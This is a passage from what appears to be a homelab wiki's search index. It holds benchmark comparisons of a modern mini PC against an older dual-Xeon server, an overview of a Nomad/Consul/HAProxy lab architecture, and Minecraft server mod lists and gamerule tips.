DDR5-5200MT/s</li> <li>Disk: 1000GB CT1000E100SSD8</li> <li>Graphics: Intel Raptor Lake-P [Iris Xe] (1500MHz)</li> <li>Audio: Conexant SN6140</li> <li>Network: Realtek RTL8125 2.5GbE + Intel Raptor Lake PCH CNVi WiFi</li> <li>OS: Rocky Linux 10.0</li> <li>Kernel: 6.12.0-55.22.1.el10_0.x86_64 (x86_64)</li> <li>Compiler: GCC 14.2.1 20250110</li> <li>File-System: xfs</li> <li>Physical dimensions: 9.8 x 10.3 x 4.2 cm</li> <li>Weight: 2.2kg</li> <li>Power draw (idle): 18W</li> <li>Power draw (max): 120W</li> </ul> <p>Sol:</p> <ul> <li>Processor: 2 x Intel Xeon E5-2637 v3 @ 3.70GHz (8 Cores / 16 Threads)</li> <li>Motherboard: HP ProLiant DL380 Gen9 (P89 BIOS)</li> <li>Chipset: Intel Xeon E7 v3/Xeon</li> <li>Memory: 16 x 16 GB DDR4-2133MT/s 752369-081</li> <li>Disk: 2400GB LOGICAL VOLUME (8x600GB 10K SAS RAID10 Storage Controller HP Smart Array P440ar)</li> <li>Graphics: Matrox MGA G200EH</li> <li>Network: 4 x Broadcom NetXtreme BCM5719 PCIe</li> <li>OS: Debian 12</li> <li>Kernel: 6.8.12-9-pve (x86_64)</li> <li>Compiler: GCC 12.2.0</li> <li>File-System: ext4</li> <li>Physical dimensions: 8.73 x 44.55 x 67.94 cm</li> <li>Weight: 23.6 kg</li> <li>Power draw (idle): 112W</li> <li>Power draw (max): 500W</li> </ul>"},{"location":"content/homelab/gmkteck10/#cpu-benchmarks","title":"CPU Benchmarks","text":"<p>Sol has: 2 x Intel Xeon E5-2637 v3 @ 3.70GHz (8 Cores / 16 Threads)</p> <p>Green has: Intel Core i9-13900HK @ 5.20GHz (14 Cores / 20 Threads)</p> <p>Results on openbenchmarking.org:</p> <ul> <li>https://openbenchmarking.org/result/2509137-NE-SOLCPU35817</li> <li>https://openbenchmarking.org/result/2509117-NE-GREENCPU761</li> </ul> Test Green Sol Difference x265 4K 5.91 fps 5.55 fps ~1.1x faster x265 1080p 20.98 fps 15.57 fps ~1.3x faster 7-Zip Compression 90,807 MIPS 48,654 MIPS ~1.9x faster 7-Zip Decompression 57,362 MIPS 42,452 MIPS ~1.4x faster Kernel Compile time 122.9 s 227.1 s ~1.8x faster OpenSSL SHA256 12.9 GB/s 2.3 GB/s ~5.6x faster OpenSSL SHA512 4.33 GB/s 2.43 GB/s ~1.8x faster RSA4096 Sign 2095 ops/s 1299 ops/s ~1.6x faster RSA4096 Verify 132,978 ops/s 87,888 ops/s ~1.5x faster AES-128-GCM 65.8 GB/s 28.4 GB/s ~2.3x faster AES-256-GCM 57.3 GB/s 21.9 GB/s ~2.6x faster ChaCha20 26.4 GB/s 27.0 GB/s ~1.0x (equal) ChaCha20-Poly1305 14.9 GB/s 16.9 GB/s ~0.1x slower (Xeon wins!) Redis GET (50 conn) 4.33M req/s 2.15M req/s ~2.0x more Redis GET (500 conn) 2.66M req/s 1.96M req/s ~1.4x more Redis GET (1000 conn) 2.32M req/s 2.18M req/s ~1.1x more Redis SET (50 conn) 2.79M req/s 1.69M req/s ~1.6x more Redis SET (500 conn) 2.24M req/s 1.66M req/s ~1.3x more Redis SET (1000 conn) 2.31M req/s 1.69M req/s ~1.4x more Redis LPOP (50 conn) 4.43M req/s 2.42M req/s ~1.8x more Redis LPOP (500 conn) 3.14M req/s 2.46M req/s ~1.3x more Redis LPOP (1000 conn) 2.72M req/s 1.55M req/s ~1.8x more Redis LPUSH (50 conn) 2.75M req/s 1.12M req/s ~2.5x more Redis LPUSH (500 conn) 1.79M req/s 1.54M req/s ~1.2x more Redis LPUSH (1000 conn) 1.79M req/s 1.49M req/s ~1.2x more Redis SADD (50 conn) 3.07M req/s 1.93M req/s ~1.6x more Redis SADD (500 conn) 2.57M req/s 1.85M req/s ~1.4x more Redis SADD (1000 conn) 2.48M req/s 1.97M req/s ~1.3x more MariaDB (1 client) 2685 QPS 207 QPS ~13.0x more MariaDB (32 clients) 2055 QPS 103 QPS ~20.0x more MariaDB (64 clients) 1621 QPS 76 QPS ~21.0x more MariaDB (128 clients) 820 QPS 44 QPS ~18.6x more MariaDB (256 clients) 397 QPS 7 QPS ~57x more MariaDB (512 clients) 184 QPS 3 QPS ~61x more MariaDB (1024-8192 clients) ~84-83 QPS ~3 QPS ~28x more"},{"location":"content/homelab/gmkteck10/#cpu-benchmarks-with-only-p-cores","title":"CPU Benchmarks with only P-cores","text":"<p>Since i9-13900HK features two kinds of cores, performance aka P-cores and efficiency aka E-cores (also known as Atom cores), it provided an interesting opportunity to test performance with E-cores off.</p> <p>Check for E-cores: <code>cat /sys/devices/cpu_atom/cpus</code></p> <p>Run task on specific cores (0-11 are P-cores in this case): <code>taskset -c 0-11 &lt;COMMAND&gt;</code></p> <p>Results on openbenchmarking.org: https://openbenchmarking.org/result/2509142-NE-CPUGREENN25</p> Test All cores Only P-cores Difference x265 4K 5.91 fps 4.24 fps ~1.39x faster x265 1080p 20.98 fps 17.51 fps ~1.20x faster 7-Zip Compression 90,807 MIPS 64,768 MIPS ~1.40x faster 7-Zip Decompression 57,362 MIPS 37,612 MIPS ~1.53x faster Linux Kernel Compile 122.90 s 178.45 s ~1.45x faster OpenSSL SHA256 12.90 GB/s 7.45 GB/s ~1.73x faster OpenSSL SHA512 4.33 GB/s 2.66 GB/s ~1.63x faster OpenSSL RSA4096 Sign 2,095 /s 1,625 /s ~1.29x faster OpenSSL RSA4096 Verify 132,978 /s 104,828 /s ~1.27x faster OpenSSL ChaCha20 26.41 GB/s 18.92 GB/s ~1.40x faster OpenSSL AES-128-GCM 65.83 GB/s 38.84 GB/s ~1.70x faster OpenSSL AES-256-GCM 57.26 GB/s 33.47 GB/s ~1.71x faster OpenSSL ChaCha20-Poly1305 14.91 GB/s 11.60 GB/s ~1.28x faster Redis GET (50 conns) 4,334,402 1,038,531 ~4.17x faster Redis SET (50 conns) 2,789,408 1,037,535 ~2.69x faster Redis GET (500 conns) 2,664,632 1,756,982 ~1.52x faster Redis LPOP (50 conns) 4,426,627 796,807 ~5.55x faster Redis SET (500 conns) 2,238,991 1,425,186 ~1.57x faster Redis LPOP (1000 conns) 2,720,310 1,467,308 ~1.85x faster Redis LPUSH (50 conns) 2,748,150 688,325 ~3.99x faster Redis SADD (500 conns) 2,567,202 1,891,882 ~1.36x faster <p>Multi-threaded tasks benefit significantly from E-cores. Decompression sees a bigger relative improvement, likely due to better multi-thread scaling. Full core usage speeds up compilation by about a third. </p> <p>Single-threaded or lightly threaded tasks benefit less but still gain some improvement when E-cores assist background threads.</p> <p>Redis throughput improves dramatically with E-cores enabled, especially at lower concurrency where single-thread performance matters less, and total parallelism dominates.</p> <p>For mixed workloads (databases, Redis, compression, video encoding), enabling all cores is needed for maximum performance. Disabling E-cores mainly limits total throughput for parallel tasks.</p>"},{"location":"content/homelab/gmkteck10/#cpu-benchmarks-with-only-one-cpu-on-dual-socket","title":"CPU Benchmarks with only one CPU on dual socket","text":"<p>Since Sol has two CPU sockets and dual CPUs, it was interesting to run benchmarks only on one of them to see a difference in terms of more equal comparison in terms of core/thread counts between the systems and, perhaps, to see how much NUMA affects the results.</p> <p>Run task only on first CPU: <code>numactl --cpubind=0 --membind=0 &lt;COMMAND&gt;</code></p> <p>Results on openbenchmarking.org: https://openbenchmarking.org/result/2509146-NE-CPUSOLSIN78</p> Test Dual CPU Single CPU socket Difference x265 4K (Bosphorus) 5.55 fps 6.16 fps ~0.90x (slower dual) x265 1080p (Bosphorus) 15.57 fps 15.84 fps ~0.98x (similar) 7-Zip Compression 48654 MIPS 25680 MIPS ~1.90x faster 7-Zip Decompression 42452 MIPS 21362 MIPS ~1.99x faster Linux Kernel Build (defconfig) 227.11 s (lower=better) 441.74 s ~1.94x faster OpenSSL SHA256 2.30e9 B/s 1.15e9 B/s ~2.00x faster OpenSSL SHA512 2.43e9 B/s 1.22e9 B/s ~1.99x faster OpenSSL RSA4096 sign 1299.7 ops/s 651.8 ops/s ~1.99x faster OpenSSL RSA4096 verify 87888 ops/s 43995 ops/s ~2.00x faster OpenSSL ChaCha20 2.70e10 B/s 1.35e10 B/s ~2.00x faster OpenSSL AES-128-GCM 2.84e10 B/s 1.42e10 B/s ~2.00x faster OpenSSL AES-256-GCM 2.19e10 B/s 1.10e10 B/s ~2.00x faster OpenSSL ChaCha20-Poly1305 1.69e10 B/s 8.48e9 B/s ~2.00x faster Redis GET (50 conn) 2,145,363 req/s 1,496,068 req/s ~1.43x faster Redis SET (50 conn) 1,688,719 req/s 993,505 req/s ~1.70x faster Redis LPOP (50 conn) 2,417,681 req/s 1,492,706 req/s ~1.62x faster Redis SADD (50 conn) 1,926,472 req/s 1,170,568 req/s ~1.65x faster Redis LPUSH (50 conn) 1,116,586 req/s 898,764 req/s ~1.24x faster Redis GET (500 conn) 1,963,410 req/s 1,466,446 req/s ~1.34x faster Redis SET (500 conn) 1,659,920 req/s 1,081,548 req/s ~1.54x faster Redis LPOP (500 conn) 2,459,230 req/s 1,660,237 req/s ~1.48x faster Redis SADD (500 conn) 1,849,049 req/s 1,323,014 req/s ~1.40x faster Redis LPUSH (500 conn) 1,538,552 req/s 964,594 req/s ~1.60x faster Redis GET (1000 conn) 2,184,990 req/s 1,437,471 req/s ~1.52x faster Redis SET (1000 conn) 1,688,344 req/s 1,087,756 req/s ~1.55x faster Redis LPOP (1000 conn) 1,552,459 req/s 1,493,120 req/s ~1.04x faster Redis SADD (1000 conn) 1,972,121 req/s 1,279,570 req/s ~1.54x faster Redis LPUSH (1000 conn) 1,491,898 req/s 951,028 req/s ~1.57x faster <p>Compute-heavy workloads (7-Zip, OpenSSL, kernel build) scale almost perfectly (~2x) with both sockets.</p> <p>x265 scaling is poor - single-socket actually edges out dual in 4K and is nearly identical in 1080p.</p>"},{"location":"content/homelab/gmkteck10/#cpu-bench-summary","title":"CPU Bench Summary","text":"Test Winner Difference Video Encoding (x265) Green ~1.1-1.3x faster Compression (7-Zip) Green ~1.4-1.9x faster Kernel Compilation Green ~1.8x faster Cryptography (SHA, RSA, AES) Green ~1.5-5.6x faster Cryptography (ChaCha20/Poly1305) sol ~1.1x faster Redis (in-memory DB) Green ~1.2-2.5x more req/s MariaDB (SQL DB) Green ~13-61x more QPS <p>Green has way better IPC with modern architecture, and in some cases can beat parallel loads (7-Zip compression) even if Sol has more threads.</p> <p>Cryptography improvements likely due to AVX2/AVX512 and AES-NI optimizations on Alder Lake vs Haswell-era Xeons. Surprisingly ChaCha20 performance is equal or even slightly better on Sol, indicating that Green's crypto accelerators favor AES but not ChaCha20. Also RSA4096 and other public-key operations scale less dramatically (~1.5-1.6x), reflecting their compute-bound nature with less dependency on memory bandwidth. ChaCha20 being faster on older Xeon is a rare scenario where lack of AES acceleration helps.</p> <p>Green consistently outperforms Sol on Redis benchmarks. However at higher concurrent connections, performance delta shrinks slightly, indicating that memory and I/O subsystem become the bottleneck at scale.</p> <p>MariaDB results in a massive difference in performance not just due to CPU but also NVMe vs RAID SAS latency. CPU cannot shine fully if disk latency dominates.</p>"},{"location":"content/homelab/gmkteck10/#disk-benchmarks","title":"Disk Benchmarks","text":"<p>Sol has: 2400GB LOGICAL VOLUME (8x600GB 10K SAS RAID10 Storage Controller HP Smart Array P440ar) on ext4</p> <p>Green has: NVMe 1000GB CT1000E100SSD8 on xfs</p> <p>Results on openbenchmarking.org:</p> <ul> <li>https://openbenchmarking.org/result/2509115-NE-DISKGREEN01</li> <li>https://openbenchmarking.org/result/2509145-NE-DISKSOL7014</li> </ul> Test Green Sol Difference SQLite 1 thread 9.747 s 231.45 s ~24x faster SQLite 2 threads 19.32 s 416.77 s ~22x faster SQLite 4 threads 18.64 s 556.95 s ~30x faster SQLite 8 threads 32.27 s 719.51 s ~22x faster SQLite 16 threads 48.89 s 948.19 s ~19x faster FIO Random Write 2MB MB/s 1.187 GB/s 0.477 GB/s ~2.5x faster FIO Random Write 4KB MB/s 1.176 GB/s 0.489 GB/s ~2.4x faster FIO Sequential Read 2MB MB/s 1.955 GB/s 0.884 GB/s ~2.2x faster FIO Sequential Read 4KB MB/s 1.942 GB/s 0.870 GB/s ~2.2x faster FIO Sequential Write 2MB MB/s 1.523 GB/s 0.737 GB/s ~2.1x faster FIO Sequential Write 4KB MB/s 1.501 GB/s 0.761 GB/s ~2x faster FS-Mark 1000 Files 829.7 files/s 43.7 files/s ~19x faster FS-Mark 4000 Files, 32 Dirs 805.8 files/s 44.8 files/s ~18x faster Dbench 1 client 398.87 MB/s 24.40 MB/s ~16x faster Dbench 12 clients 2047.02 MB/s 127.63 MB/s ~16x faster IOR 2MB / MB/s 2608.21 199.94 ~13x faster IOR 4MB / MB/s 2897.53 236.61 ~12x faster IOR 8MB / MB/s 3085.04 308.99 ~10x faster IOR 16MB / MB/s 3168.04 346.90 ~9x faster IOR 32MB / MB/s 2879.00 407.15 ~7x faster IOR 64MB / MB/s 2875.59 465.83 ~6x faster IOR 256MB / MB/s 3049.90 459.17 ~6.6x faster IOR 512MB / MB/s 2986.88 409.78 ~7.3x faster IOR 1024MB / MB/s 3391.72 382.75 ~8.9x faster"},{"location":"content/homelab/gmkteck10/#disk-benchmark-summary","title":"Disk Benchmark Summary","text":"Test Winner Difference SQLite (1-16 threads) Green ~19-30x faster FIO Random Write 2MB / 4KB Green ~2-2.5x faster FIO Sequential Read 2MB / 4KB Green ~2.2x faster FIO Sequential Write 2MB / 4KB Green ~2x faster FS-Mark small files Green ~18-19x faster Dbench (1/12 clients) Green ~16x faster IOR small blocks (2-8MB) Green ~10-13x faster IOR medium blocks (16-64MB) Green ~6-9x faster IOR large blocks (256-1024MB) Green ~6-9x faster <p>SMP performance due to DDR5's higher frequency and wider bus per channel.</p> <p>STREAM benchmarks favor Sol which is likely due to Sol's 4-channel DDR4 memory configuration (16 DIMMs across 2 CPUs), providing higher aggregate bandwidth despite slower individual DIMMs. STREAM favoring Sol shows multi-channel DDR4 can beat DDR5 for large sequential streams, but only for continuous bulk operations.</p> <p>Green shows enormous advantage in cache writes, reflecting modern CPU caches with higher associativity and faster L2/L3.</p> <p>Green's memcpy/memset performance shows low-latency benefits for small-block memory operations.</p> <p>Threaded memory operations show Green's superior per-thread latency and IPC, particularly in multi-threaded small-memory scenarios.</p> <p>Green benefits from modern DDR5 and low-latency caches for small-block memory and per-thread operations, whereas Sol's memory excels in sustained high-bandwidth workloads due to many-channel DDR4 configuration.</p>"},{"location":"content/homelab/gmkteck10/#ram-benchmarks","title":"RAM Benchmarks","text":"<p>Sol has: 16 x 16 GB DDR4-2133MT/s 752369-081</p> <p>Green has: 2 x 32 GB DDR5-5200MT/s</p> <p>Results on openbenchmarking.org:</p> <ul> <li>https://openbenchmarking.org/result/2509141-NE-RAMSOL48015</li> <li>https://openbenchmarking.org/result/2509145-NE-RAMGREEN277</li> </ul> Test Green Sol Difference RAMspeed SMP Add (Integer) 49170.75 MB/s 25245.05 MB/s ~1.9x faster RAMspeed SMP Copy (Integer) 46294.82 MB/s 24593.03 MB/s ~1.9x faster RAMspeed SMP Scale (Integer) 44536.78 MB/s 22317.15 MB/s ~2x faster RAMspeed SMP Triad (Integer) 47968.84 MB/s 24709.48 MB/s ~1.9x faster RAMspeed SMP Average (Integer) 44173.83 MB/s 24336.00 MB/s ~1.8x faster RAMspeed SMP Add (Floating Point) 45365.78 MB/s 26331.63 MB/s ~1.7x faster RAMspeed SMP Copy (Floating Point) 43004.43 MB/s 25118.17 MB/s ~1.7x faster RAMspeed SMP Scale (Floating Point) 42716.91 MB/s 22584.29 MB/s ~1.9x faster RAMspeed SMP Triad (Floating Point) 44670.74 MB/s 26515.81 MB/s ~1.7x faster RAMspeed SMP Average (Floating Point) 43906.89 MB/s 25257.18 MB/s ~1.7x faster Stream Copy 64740.8 MB/s 85814.2 MB/s ~1.3x slower Stream Scale 54172.5 MB/s 65886.2 MB/s ~1.2x slower Stream Triad 56556.2 MB/s 71293.8 MB/s ~1.3x slower Stream Add 56446.8 MB/s 71080.0 MB/s ~1.3x slower Tinymembench Memcpy 28540.4 MB/s 9522.9 MB/s ~3x faster Tinymembench Memset 56744.2 MB/s 5950.6 MB/s ~9.5x faster MBW Memory Copy 26202.42 MiB/s 11409.51 MiB/s ~2.3x faster MBW Memory Copy Fixed Block 14090.10 MiB/s 4169.46 MiB/s ~3.4x faster t-test1 Threads 1 18.05 s 32.38 s ~1.8x faster t-test1 Threads 2 5.814 s 16.51 s ~2.8x faster CacheBench Read Cache 20550.62 MB/s 9333.97 MB/s ~2.2x faster CacheBench Write Cache 268593.70 MB/s 41921.13 MB/s ~6.4x faster"},{"location":"content/homelab/gmkteck10/#ram-benchmark-summary","title":"RAM Benchmark Summary","text":"Test Winner Difference RAMspeed SMP (Integer) Green ~1.8-2x faster RAMspeed SMP (Floating Point) Green ~1.7x faster Stream Sol ~1.2-1.3x faster Tinymembench Memcpy Green ~3x faster Tinymembench Memset Green ~9.5x faster MBW Memory Copy Green ~2.3x faster MBW Memory Copy Fixed Block Green ~3.4x faster t-test1 Threads 1 Green ~1.8x faster t-test1 Threads 2 Green ~2.8x faster CacheBench Read Cache Green ~2.2x faster CacheBench Write Cache Green ~6.4x faster <p>SQLite single-threaded performance shows 24x advantage for Green; even with multiple threads, Green dominates. NVMe latency vs SAS explains this.</p> <p>FIO sequential/random throughput is 2-2.5x higher on Green. NVMe scales better due to deep queue depth and modern controller efficiency.</p> <p>IOR shows Green achieving 6-13x higher MB/s, with the delta shrinking for very large I/O blocks (32-1024MB). This suggests that RAID10 overhead in Sol becomes less significant for very large sequential transfers, but NVMe still dominates.</p> <p>FS-Mark and Dbench show Green is ~16-19x faster. This is the combined effect of NVMe low latency, XFS efficiency, and fewer mechanical seek delays than 10K SAS disks.</p> <p>NVMe SSDs provide massive latency and throughput advantages for small and large workloads alike. RAID10 SAS arrays are good for sustained large-block transfers, but fall behind in low-latency, metadata-heavy scenarios.</p>"},{"location":"content/homelab/gmkteck10/#overall-notes","title":"Overall notes","text":"<p>Green's smaller core count is offset by high IPC, modern caches, and DDR5 bandwidth. Many benchmarks (MariaDB, Redis, crypto) show that per-core performance is more important than total threads, especially for latency-sensitive workloads.</p> <p>MariaDB and SQLite show extreme differences, not just due to CPU but also NVMe vs RAID SAS latency.</p> <p>High-speed RAM benefits NVMe latency hiding. Small-block I/O (SQLite, Dbench) benefits from Green's faster memory and cache hierarchy. Sol's large-channel memory helps for sustained sequential FIO reads, but cannot compensate for mechanical seek times in small-block workloads.</p> <p>Enterprise Xeons still shine in extreme multi-threaded sequential memory or I/O scenarios, but their architecture is tuned for consistency and parallel throughput, not latency-sensitive operations.</p>"},{"location":"content/homelab/jamlabnomad/","title":"JamLab Nomad","text":""},{"location":"content/homelab/jamlabnomad/#jamlab-nomad-architecture","title":"JamLab Nomad Architecture","text":"<p>JamLab was the first, now mostly deprecated experiment to fool around with IaC concepts and Hashicorp Nomad. This page describes the JamLab Nomad architecture.</p> <p>You can also find a mediocre written report of the Nomad laboratory and a better report on monitoring the Nomad system.</p>"},{"location":"content/homelab/jamlabnomad/#abstract-overview","title":"Abstract overview","text":"<p>JamLab is a hardware installed at JamFox's home, the lab is behind switch that is connected to the NAT gateway router with a dynamic IP and is managed by one or more Proxmox Virtual Environment bare metal hypervisor hosts with a heap memory and CPU resources for running virtual machines. Internal DNS is provided by another low-power always-on bare metal host, in this case a Raspberry Pi. All bare metal hosts are configured using Red Hat Ansible. Secrets are handled by Ansible Vault. Hypervisor host runs virtual machines. Configured virtual machine templates are built with Hashicorp Packer and provisioned using Hashicorp Terraform and configured by Ansible post-provision. Virtual machines fall into two groups: base infrastructure nodes (called <code>vb</code> nodes) and service infrastructure nodes (called <code>vs</code> nodes). Base infrastructure nodes run Hashicorp Consul service discovery, Hashicorp Nomad orchestration servers. Service infrastructure nodes use Nomad clients to run containerized services.</p> <p>Features:</p> <ul> <li>Dynamically parsed hosts list: adding a new <code>vs</code> and <code>vb</code> nodes is as easy as adding a new entry to their respective host groups.</li> <li>Reproducible VM provisioning: Packer creates VM template and Terraform provisions VMs.</li> <li>Internal DNS: reach nodes via subdomain instead of trying to remember IPs.</li> <li>External DNS: internet-exposed services available with DDNS pointing to router or by using Cloudflare Tunnels.</li> <li>Load balancing dynamic services: HAProxy as the external load balancer forwards traffic to live internal load balancers integrated with Consul service discovery that forward to appropriate dynamic service hosts and ports.  </li> <li>Nomad orchestration: host any service and orchestrate it.</li> <li>Consul service discovery: services with multiple instances discoverable from <code>&lt;service name&gt;.service.consul</code> address.</li> <li>Consul Connect service mesh: Nomad services are able to securely communicate with each other with no manual plumbing configuration.</li> <li>NFS shared storage: for general shared storage and Nomad stateful storage.</li> </ul> <p>JamLab repositories:</p> <ul> <li>jamlab-ansible: Homelab bootstrap and pull-mode configuration management with Ansible and bash.</li> <li>jamlab-packer: Packer configurations for building homelab images.</li> <li>jamlab-terraform: Terraform configurations for provisioning homelab VMs.</li> </ul>"},{"location":"content/homelab/jamlabnomad/#overview-diagram","title":"Overview diagram","text":""},{"location":"content/homelab/jamlabnomad/#accessing-services","title":"Accessing services","text":"<p>Let's say that the client wishes to access a web server from the address <code>example.jamfox.dev</code>.</p> <p>If the client queries <code>example.jamfox.dev</code>:</p> <ul> <li>from outside the JamLab internal network they get back a response from external DNS (eg Namecheap DNS, Cloudflare DNS or other) pointing to a dynamic IP of the JamLab ISP router. The JamLab ISP router forwards ports to the bastion host running HAProxy.</li> <li>from inside the JamLab internal network then they get back a response from the internal DNS pointing to the bastion host running HAProxy.</li> </ul> <p>HAProxy establishes connection and terminates SSL if used. By default, HAProxy balances and directs the traffic to Fabio load balancers on <code>vs</code> nodes. If Fabio finds any Nomad services that have been tagged with the address <code>example.jamfox.dev</code> it will balance and direct the traffic to the service node(s).</p> Text Only<pre><code>                      +- HTTP(S) -&gt; Fabio LB -+-&gt; example-0 (vs0)\n                      |                       |\nHTTPS --&gt; HAProxy LB -+- HTTP(S) -&gt; Fabio LB -+-&gt; example-1 (vs1)\n                      |                       |\n                      +- HTTP(S) -&gt; Fabio LB -+-&gt; example-n (vsn)\n</code></pre> <p>Sequence diagram of the communications needed to create a successful communication from a client to a containerized service:</p> <pre><code>sequenceDiagram\n    participant web as Web Browser\n    participant dns as Internal DNS\n    participant elb as External LB\n    participant consul as Consul\n    participant ilb as Internal LBs\n    participant sv as Service\n\n    web-&gt;&gt;dns: What is \"example.jamfox.dev\"\n    dns-&gt;&gt;web: It is &lt;External LB IP&gt;\n    web-&gt;&gt;elb: HTTPS Hello \"example.jamfox.dev\"\n    elb-&gt;&gt;ilb: HTTP Hello \"example.jamfox.dev\"\n    ilb-&gt;&gt;consul: Who is \"example.service.consul\"\n    consul-&gt;&gt;ilb: It is &lt;Service IPs and ports&gt;\n    ilb-&gt;&gt;sv: HTTP Hello \"example.service.consul\"\n    sv-&gt;&gt;ilb: HTTP Response \"example.service.consul\"\n    ilb-&gt;&gt;elb: HTTP Response \"example.jamfox.dev\"\n    elb-&gt;&gt;web: HTTPS Response \"example.jamfox.dev\"</code></pre>"},{"location":"content/homelab/minecraft/","title":"Minecraft Servers","text":"<p>Info</p> <p>itzg Minecraft Server docker docs | itzg Minecraft Server source</p>"},{"location":"content/homelab/minecraft/#recommended-mods","title":"Recommended mods","text":""},{"location":"content/homelab/minecraft/#gameplay","title":"Gameplay","text":"<ul> <li>Distant Horizons: \"infinite\" render distance.</li> <li>Shaders</li> <li>Create: vanilla like tech mod with nice visuals and free-form  progression that fits right in</li> <li>Animation mods: add more/better animations</li> <li>Physics mod: add interactivity and make physics objects out of a lot of blocks and entities</li> <li>Mouse Tweaks: dragging mechanics and inventory moving</li> <li>Any inventory sorting mod</li> <li>Stack to Nearby Chests</li> <li>Stack Refill: Automatically refills the player's hand when using the final item if a replacement exists</li> <li>InvMove: move with inventory open</li> <li>FallingTree or other to cut down full trees instead of block by block</li> <li>Any mini- and/or worldmap mod</li> </ul>"},{"location":"content/homelab/minecraft/#engagement","title":"Engagement","text":"<ul> <li>DynMap: Live map webserver</li> <li>Minecraft to Discord bot: chat with players in the server from Discord</li> </ul>"},{"location":"content/homelab/minecraft/#surprises","title":"Surprises","text":"<ul> <li>Backrooms dimension: suffocation can teleport to backroom dimension</li> <li>From the Fog: Adds Herobrine </li> <li>Jesus Roulette: chance to save player from death</li> <li>Pickpocket: stealing from other players</li> <li>Bartering/Trading stations: trade between players</li> <li>Mystical Oak Tree</li> <li>Little Joys</li> </ul>"},{"location":"content/homelab/minecraft/#server-admin","title":"Server Admin","text":"<ul> <li>Chunky: pregenerate chunks.</li> <li>WorldEdit: copy, paste, use schematics, reset chunks, etc.</li> <li>Sethome or waystones: teleport for players.</li> </ul>"},{"location":"content/homelab/minecraft/#better-adventures-modpack","title":"Better Adventures Modpack","text":"<p>Stripped down version of flowstatevideo's Better Adventures+ since it was a little overblown and included some mods that are unreasonably heavy on CPU (particle mods) or caused specific lag problems.</p>"},{"location":"content/homelab/minecraft/#qol","title":"QoL","text":"<ul> <li>Stack refill</li> <li>You're in grave danger (graves)</li> <li>Horseman</li> <li>Easy Anvils</li> <li>Easy Magic</li> <li>Easy Shulker Boxes</li> <li>Jump Over Fences</li> <li>Blur+</li> <li>InvMove</li> <li>Nemo's Inventory Sorting</li> <li>Indypets</li> <li>Lootr</li> <li>Briding mod</li> <li>Mouse Tweaks</li> <li>Mouse Wheelie</li> <li>Formidable Farmland</li> <li>RightClickHarvest</li> <li>Tree Harvester</li> <li>Polymorph</li> <li>(extra) Amendments</li> <li>VanillaTweaks</li> <li>Friendly Phantoms</li> <li>Memory Settings</li> <li>Better Third Person</li> <li>Aileron</li> <li>Cubes Without Borders</li> <li>Better F3 Plus</li> <li>Dynamic Crosshair</li> <li>Better Combat</li> </ul>"},{"location":"content/homelab/minecraft/#decobuilding","title":"Deco/building","text":"<ul> <li>Clutter</li> <li>Supplementaries</li> </ul>"},{"location":"content/homelab/minecraft/#visualatmosphere","title":"Visual/atmosphere","text":"<ul> <li>Distant Horizons</li> <li>Photon Shaders</li> <li>Ambient sounds</li> <li>Spawn animations</li> <li>Terrain slabs</li> <li>(extra) Nature's Spirit</li> <li>Not Enough Animations</li> <li>(extra) Lithostitched</li> <li>(extra) Cool Rain (rain sounds on different materials)</li> <li>Camera Overhaul</li> <li>Presence Footsteps</li> <li>Cull Less Leaves</li> <li>SuperBetterGrass</li> <li>(very heavy on low end) Particle Rain</li> <li>Sound Physics Remastered</li> <li>More Mob Variants</li> <li>Adaptive Tooltips</li> <li>Chirpy's Wildlife</li> <li>Mooshroom Spawn</li> </ul>"},{"location":"content/homelab/minecraft/#social","title":"Social","text":"<ul> <li>Mighty Mail</li> <li>What are they up to</li> <li>Chat Image</li> <li>Shoppy</li> <li>Mc2Discord</li> </ul>"},{"location":"content/homelab/minecraft/#gameplay_1","title":"Gameplay","text":"<ul> <li>Tide (fishing)</li> <li>LevelZ (level up) or Pufferfish skills</li> <li>Exposure</li> <li>Applied Energistics 2 (for better storage)</li> <li>Traveler's backpack</li> <li>Farmer's Delight</li> <li>Little Joys</li> <li>Waystones</li> <li>Nyf's Spiders</li> <li>Xaero's map and minimap</li> <li>Create</li> <li>Majrusz's Enchantments + Universal Enchants</li> <li>Majrusz's Accessories</li> <li>Extra Alchemy</li> <li>Trinkets</li> <li>Randomium Ore</li> <li>Craftable Experience Bottle + Uhm..Did i just get experience ? + Exp Ore + Experienced Crops + Tax Free Levels</li> <li>Artifacts (rare loot)</li> <li>The Aether</li> <li>Better Archeology</li> <li>Dis-Enchanting Table</li> <li>Critters and Companions</li> <li>Only Hammers and Excavators</li> <li>Effortless Structure</li> <li>Naturalist</li> </ul>"},{"location":"content/homelab/minecraft/#world-generation","title":"World Generation","text":"<ul> <li>Regions Unexplored</li> <li>Biomes O' Plenty</li> <li>Tectonic (especially with dh)</li> <li>Dungeon now loading</li> <li>Bosses of Mass Destruction</li> <li>YUNG's better collection</li> <li>William Wythers' Expanded Ecosphere + William Wythers' Overhauled Overworld</li> <li>ChoiceTheorem's Overhauled Village</li> <li>Incendium (nether biomes overhaul)</li> <li>BetterNether</li> <li>BetterEnd</li> <li>Aquamirae</li> </ul>"},{"location":"content/homelab/minecraft/#resource-packs","title":"Resource Packs","text":"<ul> <li>Fresh Animations</li> <li>Fresh Moves</li> <li>(Bee's) Fancy Crops</li> <li>Enchant Icons</li> <li>Fresh Compats</li> <li>More Mob Variants x Fresh Animations</li> <li>Overlay\u2019s</li> <li>F.M.R.P</li> </ul>"},{"location":"content/homelab/minecraft/#optimizations","title":"Optimizations","text":"<ul> <li>Fast Item Frames</li> <li>ModernFix</li> <li>BadOptimizations</li> <li>Entity Culling</li> <li>More Culling</li> <li>Clumps</li> <li>C2me</li> <li>noisium</li> <li>Memory Leak Fix</li> <li>Sodium + Indium + Enhanced Block Entities</li> <li>Enhanced Block Entities</li> <li>ImmediatelyFast</li> </ul>"},{"location":"content/homelab/minecraft/#server","title":"Server","text":"<ul> <li>Server Performance - Smooth Chunk Save</li> <li>Chunky + Chunky Border</li> <li>Worldedit</li> <li>Ready player fun (pause without alert spam)</li> <li>Enchanting Commands</li> <li>ServerCore</li> <li>BetterDays</li> <li>Krypton</li> <li>Starlight</li> </ul>"},{"location":"content/homelab/minecraft/#server-admin-tweaks-and-tips","title":"Server admin tweaks and tips","text":""},{"location":"content/homelab/minecraft/#useful-gamerules","title":"Useful gamerules","text":"<p>Set how many players have to be sleeping to skip a night: <code>/gamerule playersSleepingPercentage 30</code></p> <p>To keep inventory after dying: <code>/gamerule keepInventory true</code></p> <p>To keep XP after death: <code>/gamerule keepXPAfterDeath true</code></p> <p>Add a stat to scoreboard (seen on TAB 